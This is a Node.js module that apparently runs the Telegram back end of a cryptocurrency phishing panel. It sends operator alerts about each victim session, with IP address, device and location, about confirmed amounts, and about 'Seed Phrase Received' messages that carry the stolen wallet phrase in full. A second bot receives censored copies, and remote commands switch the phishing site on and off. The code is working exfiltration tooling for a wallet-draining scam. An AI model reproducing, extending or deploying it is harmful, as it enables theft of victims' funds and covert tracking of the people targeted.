import fetch from 'node-fetch';
import dotenv from 'dotenv';
dotenv.config();


const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const SECONDARY_TELEGRAM_BOT_TOKEN = process.env.SECONDARY_TELEGRAM_BOT_TOKEN;
const SECONDARY_TELEGRAM_CHAT_ID = process.env.SECONDARY_TELEGRAM_CHAT_ID;

// Apple-style separator
const SEPARATOR = '━━━━━━━━━━━━━━━';

let settingsRef = null;
let lastUpdateId = 0;

export function initTelegramService(settings) {
    settingsRef = settings;
    startPolling();
}

// Start polling for Telegram updates
async function startPolling() {
    while (true) {
        try {
            const response = await fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`
            );
            
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                for (const update of data.result) {
                    if (update.message?.text) {
                        await handleTelegramCommand(update.message);
                    }
                    lastUpdateId = update.update_id;
                }
            }
        } catch (error) {
            console.error('Telegram polling error:', error);
        }
        
        // Small delay to prevent too frequent requests in case of errors
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}

// Handle incoming Telegram commands
async function handleTelegramCommand(message) {
    const text = message.text?.toLowerCase();
    
    if (!text?.startsWith('/')) return;

    const command = text.split(' ')[0];
    const param = text.split(' ')[1];

    switch (command) {
        case '/panel':
            if (param === 'on' || param === 'off') {
                const newStatus = param === 'on';
                settingsRef.websiteEnabled = newStatus;
                await sendStatusUpdate({
                    websiteEnabled: newStatus,
                    activeSessions: settingsRef.sessions?.size || 0,
                    bannedIPs: settingsRef.bannedIPs?.size || 0
                });
            }
            break;

        case '/status':
            await sendStatusUpdate({
                websiteEnabled: settingsRef.websiteEnabled,
                activeSessions: settingsRef.sessions?.size || 0,
                bannedIPs: settingsRef.bannedIPs?.size || 0
            });
            break;
    }
}

// Helper function to send plain text notification (fallback when HTML parsing fails)
async function sendPlainTextNotification(message) {
    try {
        // Strip HTML tags from message
        const plainText = message.replace(/<[^>]*>/g, '');
        
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: plainText
                // No parse_mode for plain text
            })
        });

        if (!response.ok) {
            const data = await response.json();
            throw new Error(`Telegram API error (plain text): ${data.description || response.statusText}`);
        }

        return await response.json();
    } catch (error) {
        console.error('Failed to send plain text notification:', error);
        return null;
    }
}

export async function sendTelegramNotification(message, retryCount = 0) {
    const maxRetries = 3;
    const retryDelay = Math.min(1000 * Math.pow(2, retryCount), 10000); // Exponential backoff, max 10 seconds
    
    try {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.log('Telegram notification (disabled):', message);
            return;
        }

        // Validate message
        if (!message || typeof message !== 'string') {
            console.error('Invalid message format:', typeof message);
            return null;
        }

        // Telegram has a 4096 character limit for messages
        if (message.length > 4096) {
            console.warn('Message too long, truncating to 4096 characters');
            message = message.substring(0, 4093) + '...';
        }

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            }),
            timeout: 10000 // 10 second timeout
        });

        const data = await response.json();
        
        if (!response.ok) {
            // Log detailed error information
            console.error('Telegram API error details:', {
                status: response.status,
                statusText: response.statusText,
                error_code: data.error_code,
                description: data.description,
                parameters: data.parameters
            });
            
            // Common Telegram API errors
            if (data.error_code === 400) {
                if (data.description?.includes('chat not found')) {
                    console.error('Invalid TELEGRAM_CHAT_ID. Please check your .env configuration');
                } else if (data.description?.includes('message text is empty')) {
                    console.error('Empty message text');
                } else if (data.description?.includes('can\'t parse entities')) {
                    console.error('Invalid HTML in message. Falling back to plain text');
                    // Retry without HTML parsing
                    return sendPlainTextNotification(message);
                }
            } else if (data.error_code === 401) {
                console.error('Invalid TELEGRAM_BOT_TOKEN. Please check your .env configuration');
            } else if (data.error_code === 429) {
                console.error('Rate limit exceeded. Too many requests');
                // Retry with backoff for rate limiting
                if (retryCount < maxRetries) {
                    const retryAfter = data.parameters?.retry_after || retryDelay / 1000;
                    console.log(`Retrying after ${retryAfter} seconds (attempt ${retryCount + 1}/${maxRetries})`);
                    await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
                    return sendTelegramNotification(message, retryCount + 1);
                }
            }
            
            throw new Error(`Telegram API error: ${data.description || response.statusText}`);
        }
        
        console.log(`Telegram notification sent successfully${retryCount > 0 ? ` (retry ${retryCount})` : ''}`);
        
        // Send to secondary bot for specific notification types
        if (message.includes('𝗡𝗲𝘄 𝗦𝗲𝘀𝘀𝗶𝗼𝗻') || 
            message.includes('𝗔𝗺𝗼𝘂𝗻𝘁 𝗖𝗼𝗻𝗳𝗶𝗿𝗺𝗲𝗱') || 
            message.includes('𝗦𝗲𝗲𝗱 𝗣𝗵𝗿𝗮𝘀𝗲 𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱')) {
            
            // For seed phrase, censor the actual phrase
            let secondaryMessage = message;
            if (message.includes('𝗦𝗲𝗲𝗱 𝗣𝗵𝗿𝗮𝘀𝗲 𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱')) {
                secondaryMessage = message.replace(/<code>.*<\/code>/, '<code>[CENSORED]</code>');
            }
            
            await sendSecondaryNotification(secondaryMessage);
        }
        
        return data;
    } catch (error) {
        console.error('Failed to send Telegram notification:', error);
        
        // Retry for network errors or timeouts
        if (retryCount < maxRetries && (
            error.code === 'ECONNRESET' ||
            error.code === 'ETIMEDOUT' ||
            error.code === 'ENOTFOUND' ||
            error.message?.includes('fetch failed') ||
            error.message?.includes('network')
        )) {
            console.log(`Network error, retrying in ${retryDelay/1000} seconds (attempt ${retryCount + 1}/${maxRetries})`);
            await new Promise(resolve => setTimeout(resolve, retryDelay));
            return sendTelegramNotification(message, retryCount + 1);
        }
        
        return null;
    }
}

async function sendSecondaryNotification(message) {
    try {
        if (!SECONDARY_TELEGRAM_BOT_TOKEN || !SECONDARY_TELEGRAM_CHAT_ID) {
            console.log('Secondary Telegram notification (disabled):', message);
            return;
        }

        const url = `https://api.telegram.org/bot${SECONDARY_TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: SECONDARY_TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            throw new Error(`Secondary Telegram API error: ${response.statusText}`);
        }

        return await response.json();
    } catch (error) {
        console.error('Failed to send secondary Telegram notification:', error);
        return null;
    }
}

export function formatTelegramMessage(type, data) {
    const timestamp = new Date().toLocaleTimeString('en-US', { 
        hour12: true,
        hour: 'numeric',
        minute: '2-digit'
    });

    switch (type) {
        case 'server_status':
            return [
                '𝗦𝗲𝗿𝘃𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀',
                SEPARATOR,
                `⚡️ Status: ${data.status}`,
                `🔌 Port: ${data.port}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'new_session':
            return [
                '𝗡𝗲𝘄 𝗦𝗲𝘀𝘀𝗶𝗼𝗻',
                SEPARATOR,
                `⌥ Session ID: ${data.id}`,
                `📱 Device: ${data.userAgent}`,
                `🌍 IP Address: ${data.ip}`,
                `📍 Location: ${data.location}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'review_completed':
            return [
                '𝗥𝗲𝘃𝗶𝗲𝘄 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱',
                SEPARATOR,
                `⌥ Session ID: ${data.sessionId}`,
                `🌍 IP Address: ${data.ip}`,
                `📍 Location: ${data.location}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'amount_confirmed':
            return [
                '𝗔𝗺𝗼𝘂𝗻𝘁 𝗖𝗼𝗻𝗳𝗶𝗿𝗺𝗲𝗱',
                SEPARATOR,
                `⌥ Session ID: ${data.sessionId}`,
                `💰 Amount: ${data.amount}`,
                `🌍 IP Address: ${data.ip}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'seed_phrase':
            return [
                '𝗦𝗲𝗲𝗱 𝗣𝗵𝗿𝗮𝘀𝗲 𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱',
                SEPARATOR,
                `⌥ Session ID: ${data.sessionId}`,
                `🌍 IP Address: ${data.ip}`,
                `📍 Location: ${data.location}`,
                `🔑 Seed Phrase:`,
                `<code>${data.seedPhrase}</code>`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'session_ended':
            return [
                '𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗘𝗻𝗱𝗲𝗱',
                SEPARATOR,
                `⌥ Session ID: ${data.id}`,
                `⏱ Duration: ${formatDuration(data.duration)}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'settings_changed':
            return [
                '𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀 𝗨𝗽𝗱𝗮𝘁𝗲𝗱',
                SEPARATOR,
                ...Object.entries(data).map(([key, value]) => 
                    `⚡️ ${key}: ${value}`
                ),
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'ip_banned':
            return [
                '𝗜𝗣 𝗕𝗮𝗻𝗻𝗲𝗱',
                SEPARATOR,
                `🌍 IP Address: ${data.ip}`,
                `👤 Banned By: ${data.bannedBy}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

            case 'ip_unbanned':
                return [
                    '𝗜𝗣 𝗨𝗻𝗯𝗮𝗻𝗻𝗲𝗱',
                    SEPARATOR,
                    `🌍 IP Address: ${data.ip}`,
                    SEPARATOR,
                    `⏰ ${timestamp}`
                ].join('\n');
    
            case 'session_removed':
                return [
                    '𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗥𝗲𝗺𝗼𝘃𝗲𝗱',
                    SEPARATOR,
                    `⌥ Session ID: ${data.id}`,
                    `👤 Removed By: ${data.removedBy}`,
                    SEPARATOR,
                    `⏰ ${timestamp}`
                ].join('\n');
    
            default:
            return [
                '𝗡𝗼𝘁𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻',
                SEPARATOR,
                data.toString(),
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');
    }
}

function formatDuration(ms) {
    const seconds = Math.floor(ms / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);
    
    if (hours > 0) {
        return `${hours}h ${minutes % 60}m`;
    } else if (minutes > 0) {
        return `${minutes}m ${seconds % 60}s`;
    } else {
        return `${seconds}s`;
    }
}

export async function sendStatusUpdate(status) {
    const timestamp = new Date().toLocaleTimeString('en-US', { 
        hour12: true,
        hour: 'numeric',
        minute: '2-digit'
    });

    const message = [
        '𝗦𝘁𝗮𝘁𝘂𝘀 𝗨𝗽𝗱𝗮𝘁𝗲',
        SEPARATOR,
        `👥 Active Sessions: ${status.activeSessions}`,
        `🚫 Banned IPs: ${status.bannedIPs}`,
        `${status.websiteEnabled ? '✅' : '❌'} Website Status: ${status.websiteEnabled ? 'Online' : 'Offline'}`,
        SEPARATOR,
        `⏰ ${timestamp}`
    ].join('\n');

    return sendTelegramNotification(message);
}

export async function sendErrorNotification(error) {
    const timestamp = new Date().toLocaleTimeString('en-US', { 
        hour12: true,
        hour: 'numeric',
        minute: '2-digit'
    });

    const message = [
        '𝗘𝗿𝗿𝗼𝗿 𝗔𝗹𝗲𝗿𝘁',
        SEPARATOR,
        `⚠️ ${error.name}`,
        `❌ ${error.message}`,
        SEPARATOR,
        `⏰ ${timestamp}`
    ].join('\n');

    return sendTelegramNotification(message);
}

export const telegramUtils = {
    formatDuration,
    formatTelegramMessage,
    sendStatusUpdate,
    sendErrorNotification
};